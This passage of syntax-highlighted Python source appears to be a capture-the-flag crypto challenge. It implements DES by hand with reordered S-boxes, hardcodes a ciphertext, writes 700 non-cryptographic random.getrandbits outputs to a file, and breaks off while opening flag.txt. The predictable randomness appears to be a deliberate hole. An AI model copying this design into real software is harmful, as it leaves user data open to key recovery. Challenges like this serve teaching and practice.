class="string">'0110'</span>,</span><br><span class="line">    <span class="string">'7'</span>: <span class="string">'0111'</span>,</span><br><span class="line">    <span class="string">'8'</span>: <span class="string">'1000'</span>,</span><br><span class="line">    <span class="string">'9'</span>: <span class="string">'1001'</span>,</span><br><span class="line">    <span class="string">'a'</span>: <span class="string">'1010'</span>,</span><br><span class="line">    <span class="string">'b'</span>: <span class="string">'1011'</span>,</span><br><span class="line">    <span class="string">'c'</span>: <span class="string">'1100'</span>,</span><br><span class="line">    <span class="string">'d'</span>: <span class="string">'1101'</span>,</span><br><span class="line">    <span class="string">'e'</span>: <span class="string">'1110'</span>,</span><br><span class="line">    <span class="string">'f'</span>: <span class="string">'1111'</span>,</span><br><span class="line">&#125;</span><br><span class="line">IP = [<span class="number">58</span>, <span class="number">50</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">26</span>, <span class="number">18</span>, <span class="number">10</span>, <span class="number">2</span>,</span><br><span class="line">      <span class="number">60</span>, <span class="number">52</span>, <span class="number">44</span>, <span class="number">36</span>, <span class="number">28</span>, <span class="number">20</span>, <span class="number">12</span>, <span class="number">4</span>,</span><br><span class="line">      <span class="number">62</span>, <span class="number">54</span>, <span class="number">46</span>, <span class="number">38</span>, <span class="number">30</span>, <span class="number">22</span>, <span class="number">14</span>, <span class="number">6</span>,</span><br><span class="line">      <span class="number">64</span>, <span class="number">56</span>, <span class="number">48</span>, <span class="number">40</span>, <span class="number">32</span>, <span class="number">24</span>, <span class="number">16</span>, <span class="number">8</span>,</span><br><span class="line">      <span class="number">57</span>, <span class="number">49</span>, <span class="number">41</span>, <span class="number">33</span>, <span class="number">25</span>, <span class="number">17</span>, <span class="number">9</span>, <span class="number">1</span>,</span><br><span class="line">      <span class="number">59</span>, <span class="number">51</span>, <span class="number">43</span>, <span class="number">35</span>, <span class="number">27</span>, <span class="number">19</span>, <span class="number">11</span>, <span class="number">3</span>,</span><br><span class="line">      <span class="number">61</span>, <span class="number">53</span>, <span class="number">45</span>, <span class="number">37</span>, <span class="number">29</span>, <span class="number">21</span>, <span class="number">13</span>, <span class="number">5</span>,</span><br><span class="line">      <span class="number">63</span>, <span class="number">55</span>, <span class="number">47</span>, <span class="number">39</span>, <span class="number">31</span>, <span class="number">23</span>, <span class="number">15</span>, <span class="number">7</span>]</span><br><span class="line">IP_1 = [<span class="number">40</span>, <span class="number">8</span>, <span class="number">48</span>, <span class="number">16</span>, <span class="number">56</span>, <span class="number">24</span>, <span class="number">64</span>, <span class="number">32</span>,</span><br><span class="line">        <span class="number">39</span>, <span class="number">7</span>, <span class="number">47</span>, <span class="number">15</span>, <span class="number">55</span>, <span class="number">23</span>, <span class="number">63</span>, <span class="number">31</span>,</span><br><span class="line">        <span class="number">38</span>, <span class="number">6</span>, <span class="number">46</span>, <span class="number">14</span>, <span class="number">54</span>, <span class="number">22</span>, <span class="number">62</span>, <span class="number">30</span>,</span><br><span class="line">        <span class="number">37</span>, <span class="number">5</span>, <span class="number">45</span>, <span class="number">13</span>, <span class="number">53</span>, <span class="number">21</span>, <span class="number">61</span>, <span class="number">29</span>,</span><br><span class="line">        <span class="number">36</span>, <span class="number">4</span>, <span class="number">44</span>, <span class="number">12</span>, <span class="number">52</span>, <span class="number">20</span>, <span class="number">60</span>, <span class="number">28</span>,</span><br><span class="line">        <span class="number">35</span>, <span class="number">3</span>, <span class="number">43</span>, <span class="number">11</span>, <span class="number">51</span>, <span class="number">19</span>, <span class="number">59</span>, <span class="number">27</span>,</span><br><span class="line">        <span class="number">34</span>, <span class="number">2</span>, <span class="number">42</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">18</span>, <span class="number">58</span>, <span class="number">26</span>,</span><br><span class="line">        <span class="number">33</span>, <span class="number">1</span>, <span class="number">41</span>, <span class="number">9</span>, <span class="number">49</span>, <span class="number">17</span>, <span class="number">57</span>, <span class="number">25</span>]</span><br><span class="line">E = [<span class="number">32</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>,</span><br><span class="line">     <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>,</span><br><span class="line">     <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>,</span><br><span class="line">     <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>,</span><br><span class="line">     <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>,</span><br><span class="line">     <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>,</span><br><span class="line">     <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">29</span>,</span><br><span class="line">     <span class="number">28</span>, <span class="number">29</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">32</span>, <span class="number">1</span>]</span><br><span class="line">S = [[<span class="number">15</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">10</span>,</span><br><span class="line">      <span class="number">3</span>, <span class="number">13</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">15</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">14</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">11</span>, <span class="number">5</span>,</span><br><span class="line">      <span class="number">0</span>, <span class="number">14</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">10</span>, <span class="number">4</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">12</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">15</span>,</span><br><span class="line">      <span class="number">13</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">15</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">11</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">14</span>, <span class="number">9</span>, ],</span><br><span class="line">     [<span class="number">10</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">8</span>,</span><br><span class="line">      <span class="number">13</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">14</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">15</span>, <span class="number">1</span>,</span><br><span class="line">      <span class="number">13</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">15</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">7</span>,</span><br><span class="line">      <span class="number">1</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">15</span>, <span class="number">14</span>, <span class="number">3</span>, <span class="number">11</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">12</span>, ],</span><br><span class="line">     [<span class="number">14</span>, <span class="number">4</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">15</span>, <span class="number">11</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">7</span>,</span><br><span class="line">      <span class="number">0</span>, <span class="number">15</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">14</span>, <span class="number">2</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">8</span>,</span><br><span class="line">      <span class="number">4</span>, <span class="number">1</span>, <span class="number">14</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">11</span>, <span class="number">15</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">3</span>, <span class="number">10</span>, <span class="number">5</span>, <span class="number">0</span>,</span><br><span class="line">      <span class="number">15</span>, <span class="number">12</span>, <span class="number">8</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">14</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">13</span>, ],</span><br><span class="line">     [<span class="number">7</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">15</span>,</span><br><span class="line">      <span class="number">13</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">9</span>,</span><br><span class="line">      <span class="number">10</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">7</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">14</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">4</span>,</span><br><span class="line">      <span class="number">3</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">13</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">14</span>, ],</span><br><span class="line">     [<span class="number">2</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">15</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">9</span>,</span><br><span class="line">      <span class="number">14</span>, <span class="number">11</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">10</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">6</span>,</span><br><span class="line">      <span class="number">4</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">11</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">15</span>, <span class="number">9</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">14</span>,</span><br><span class="line">      <span class="number">11</span>, <span class="number">8</span>, <span class="number">12</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">14</span>, <span class="number">2</span>, <span class="number">13</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">3</span>, ],</span><br><span class="line">     [<span class="number">12</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">9</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">13</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">14</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">11</span>,</span><br><span class="line">      <span class="number">10</span>, <span class="number">15</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">8</span>,</span><br><span class="line">      <span class="number">9</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">12</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">13</span>, <span class="number">11</span>, <span class="number">6</span>,</span><br><span class="line">      <span class="number">4</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">15</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">14</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">13</span>, ],</span><br><span class="line">     [<span class="number">4</span>, <span class="number">11</span>, <span class="number">2</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">3</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">1</span>,</span><br><span class="line">      <span class="number">13</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">12</span>, <span class="number">2</span>, <span class="number">15</span>, <span class="number">8</span>, <span class="number">6</span>,</span><br><span class="line">      <span class="number">1</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">14</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">2</span>,</span><br><span class="line">      <span class="number">6</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">10</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">14</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">12</span>, ],</span><br><span class="line">     [<span class="number">13</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">11</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">14</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">7</span>,</span><br><span class="line">      <span class="number">1</span>, <span class="number">15</span>, <span class="number">13</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">11</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">9</span>, <span class="number">2</span>,</span><br><span class="line">      <span class="number">7</span>, <span class="number">11</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">12</span>, <span class="number">14</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">8</span>,</span><br><span class="line">      <span class="number">2</span>, <span class="number">1</span>, <span class="number">14</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">10</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">11</span>, ]]</span><br><span class="line">PC_1 = [<span class="number">57</span>, <span class="number">49</span>, <span class="number">41</span>, <span class="number">33</span>, <span class="number">25</span>, <span class="number">17</span>, <span class="number">9</span>, <span class="number">1</span>,</span><br><span class="line">        <span class="number">58</span>, <span class="number">50</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">26</span>, <span class="number">18</span>, <span class="number">10</span>, <span class="number">2</span>,</span><br><span class="line">        <span class="number">59</span>, <span class="number">51</span>, <span class="number">43</span>, <span class="number">35</span>, <span class="number">27</span>, <span class="number">19</span>, <span class="number">11</span>, <span class="number">3</span>,</span><br><span class="line">        <span class="number">60</span>, <span class="number">52</span>, <span class="number">44</span>, <span class="number">36</span>, <span class="number">63</span>, <span class="number">55</span>, <span class="number">47</span>, <span class="number">39</span>,</span><br><span class="line">        <span class="number">31</span>, <span class="number">23</span>, <span class="number">15</span>, <span class="number">7</span>, <span class="number">62</span>, <span class="number">54</span>, <span class="number">46</span>, <span class="number">38</span>,</span><br><span class="line">        <span class="number">30</span>, <span class="number">22</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">61</span>, <span class="number">53</span>, <span class="number">45</span>, <span class="number">37</span>,</span><br><span class="line">        <span class="number">29</span>, <span class="number">21</span>, <span class="number">13</span>, <span class="number">5</span>, <span class="number">28</span>, <span class="number">20</span>, <span class="number">12</span>, <span class="number">4</span>, ]</span><br><span class="line">PC_2 = [<span class="number">14</span>, <span class="number">17</span>, <span class="number">11</span>, <span class="number">24</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">28</span>,</span><br><span class="line">        <span class="number">15</span>, <span class="number">6</span>, <span class="number">21</span>, <span class="number">10</span>, <span class="number">23</span>, <span class="number">19</span>, <span class="number">12</span>, <span class="number">4</span>,</span><br><span class="line">        <span class="number">26</span>, <span class="number">8</span>, <span class="number">16</span>, <span class="number">7</span>, <span class="number">27</span>, <span class="number">20</span>, <span class="number">13</span>, <span class="number">2</span>,</span><br><span class="line">        <span class="number">41</span>, <span class="number">52</span>, <span class="number">31</span>, <span class="number">37</span>, <span class="number">47</span>, <span class="number">55</span>, <span class="number">30</span>, <span class="number">40</span>,</span><br><span class="line">        <span class="number">51</span>, <span class="number">45</span>, <span class="number">33</span>, <span class="number">48</span>, <span class="number">44</span>, <span class="number">49</span>, <span class="number">39</span>, <span class="number">56</span>,</span><br><span class="line">        <span class="number">34</span>, <span class="number">53</span>, <span class="number">46</span>, <span class="number">42</span>, <span class="number">50</span>, <span class="number">36</span>, <span class="number">29</span>, <span class="number">32</span>, ]</span><br><span class="line">P = [<span class="number">16</span>, <span class="number">7</span>, <span class="number">20</span>, <span class="number">21</span>,</span><br><span class="line">     <span class="number">29</span>, <span class="number">12</span>, <span class="number">28</span>, <span class="number">17</span>,</span><br><span class="line">     <span class="number">1</span>, <span class="number">15</span>, <span class="number">23</span>, <span class="number">26</span>,</span><br><span class="line">     <span class="number">5</span>, <span class="number">18</span>, <span class="number">31</span>, <span class="number">10</span>,</span><br><span class="line">     <span class="number">2</span>, <span class="number">8</span>, <span class="number">24</span>, <span class="number">14</span>,</span><br><span class="line">     <span class="number">32</span>, <span class="number">27</span>, <span class="number">3</span>, <span class="number">9</span>,</span><br><span class="line">     <span class="number">19</span>, <span class="number">13</span>, <span class="number">30</span>, <span class="number">6</span>,</span><br><span class="line">     <span class="number">22</span>, <span class="number">11</span>, <span class="number">4</span>, <span class="number">25</span>, ]</span><br><span class="line">movnum = [<span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">HexToBin</span><span class="params">(string)</span>:</span></span><br><span class="line">    <span class="string">"Convert sixteen to binary"</span></span><br><span class="line"></span><br><span class="line">    Binstring = <span class="string">""</span></span><br><span class="line">    string = string.lower()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> string:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            Binstring += hexadecimalcontrast[i]</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line">    <span class="keyword">return</span> Binstring</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">BinToStr</span><span class="params">(strbin)</span>:</span></span><br><span class="line">    <span class="string">"Turn the binary string to a ASCII string"</span></span><br><span class="line"></span><br><span class="line">    strten = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(strbin) // <span class="number">8</span>):</span><br><span class="line">        num = <span class="number">0</span></span><br><span class="line">        test = strbin[i * <span class="number">8</span>:i * <span class="number">8</span> + <span class="number">8</span>]</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">            num += int(test[j]) * (<span class="number">2</span>**(<span class="number">7</span> - j))</span><br><span class="line">        strten += chr(num)</span><br><span class="line">    <span class="keyword">return</span> strten</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">StrToHex</span><span class="params">(string)</span>:</span></span><br><span class="line">    <span class="string">"Converts a string to HEX"</span></span><br><span class="line"></span><br><span class="line">    hexStr = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> string:</span><br><span class="line">        tmp = str(hex(ord(i)))</span><br><span class="line">        <span class="keyword">if</span> len(tmp) == <span class="number">3</span>:</span><br><span class="line">            hexStr += tmp.replace(<span class="string">'0x'</span>, <span class="string">'0'</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            hexStr += tmp.replace(<span class="string">'0x'</span>, <span class="string">''</span>)</span><br><span class="line">    <span class="keyword">return</span> hexStr</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Binxor</span><span class="params">(string1, string2)</span>:</span></span><br><span class="line">    <span class="string">"If the length is different, only the short one is returned."</span></span><br><span class="line"></span><br><span class="line">    strlen = <span class="number">0</span></span><br><span class="line">    xorstr = <span class="string">""</span></span><br><span class="line">    <span class="keyword">if</span> len(string1) &gt; len(string2):</span><br><span class="line">        strlen = len(string2)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        strlen = len(string1)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(strlen):</span><br><span class="line">        <span class="keyword">if</span> string1[i] == string2[i]:</span><br><span class="line">            xorstr += <span class="string">'0'</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            xorstr += <span class="string">'1'</span></span><br><span class="line">    <span class="keyword">return</span> xorstr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">SubstitutionBox</span><span class="params">(keyfield, sub)</span>:</span></span><br><span class="line"></span><br><span class="line">    newkeyfield = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(sub)):</span><br><span class="line">        newkeyfield += keyfield[sub[i] - <span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> newkeyfield</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">SubkeyGeneration</span><span class="params">(freq, C, D)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(movnum[freq]):</span><br><span class="line">        C = C[<span class="number">1</span>:] + C[:<span class="number">1</span>]</span><br><span class="line">        D = D[<span class="number">1</span>:] + D[:<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> C, D, SubstitutionBox(C + D, PC_2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">enkey</span><span class="params">(secretkey)</span>:</span> </span><br><span class="line"></span><br><span class="line">    netss = SubstitutionBox(HexToBin(StrToHex(secretkey)), PC_1)</span><br><span class="line">    C, D = netss[:<span class="number">28</span>], netss[<span class="number">28</span>:]</span><br><span class="line">    key = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>): </span><br><span class="line">        C, D, keyone = SubkeyGeneration(i, C, D)</span><br><span class="line">        key.append(keyone)</span><br><span class="line">    <span class="keyword">return</span> key</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Sbox</span><span class="params">(plaintext, sub)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> HexToBin(<span class="string">"%x"</span> % S[sub][int(plaintext[:<span class="number">1</span>] + plaintext[<span class="number">-1</span>:], <span class="number">2</span>) * <span class="number">16</span> + int(plaintext[<span class="number">1</span>:<span class="number">-1</span>], <span class="number">2</span>)])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Function</span><span class="params">(plaintext, secretkey)</span>:</span></span><br><span class="line"></span><br><span class="line">    plaintext = Binxor(SubstitutionBox(plaintext, E),</span><br><span class="line">                       secretkey)</span><br><span class="line">    sout = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">        sout += Sbox(plaintext[i * <span class="number">6</span>:(i + <span class="number">1</span>) * <span class="number">6</span>], i)</span><br><span class="line">    sout = SubstitutionBox(sout, P)</span><br><span class="line">    <span class="keyword">return</span> sout</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">endecrypt</span><span class="params">(plaintext, secretkey)</span>:</span></span><br><span class="line"></span><br><span class="line">    netss = SubstitutionBox(HexToBin(StrToHex(plaintext)), IP)</span><br><span class="line">    L, R = netss[:<span class="number">32</span>], netss[<span class="number">32</span>:]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">        L, R = R, Binxor(L, Function(R, secretkey[i]))</span><br><span class="line">    <span class="keyword">return</span> SubstitutionBox(R + L, IP_1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encryption</span><span class="params">(plaintext, secretkey)</span>:</span></span><br><span class="line"></span><br><span class="line">    plaintext = plaintext + (<span class="number">8</span> - len(plaintext) % <span class="number">8</span>) * <span class="string">'\0'</span></span><br><span class="line">    keys = enkey(secretkey[:<span class="number">8</span>])</span><br><span class="line">    print(keys)</span><br><span class="line">    ciphertext = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(plaintext) / <span class="number">8</span>):</span><br><span class="line">        ciphertext += endecrypt(plaintext[i * <span class="number">8</span>:(i + <span class="number">1</span>) * <span class="number">8</span>], keys)</span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(BinToStr(ciphertext))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decryption</span><span class="params">(plaintext, secretkey)</span>:</span></span><br><span class="line">    plaintext = <span class="string">"t2GzuEfVDaJsNLBqC8N7C3/2UgIeCoQLC2qLkT1ukFULskzMc1u9QeFizVUfFYfA"</span></span><br><span class="line">    plaintext = base64.b64decode(plaintext)</span><br><span class="line">    <span class="keyword">print</span> plaintext</span><br><span class="line">    keys = enkey(secretkey[:<span class="number">8</span>])[::<span class="number">-1</span>]</span><br><span class="line">    <span class="comment">#print(keys)</span></span><br><span class="line">    ciphertext = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(plaintext) / <span class="number">8</span>):</span><br><span class="line">        ciphertext += endecrypt(plaintext[i * <span class="number">8</span>:(i + <span class="number">1</span>) * <span class="number">8</span>], keys)</span><br><span class="line">    <span class="keyword">return</span> (BinToStr(ciphertext))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate</span><span class="params">()</span>:</span></span><br><span class="line">    fw = open(<span class="string">"random"</span>, <span class="string">"w"</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">700</span>):</span><br><span class="line">        fw.write(str(random.getrandbits(<span class="number">32</span>))+<span class="string">"\n"</span>)</span><br><span class="line">    fw.close()</span><br><span class="line"></span><br><span class="line">generate()</span><br><span class="line">f = open(<span class="string">"flag.txt"</span>, <span 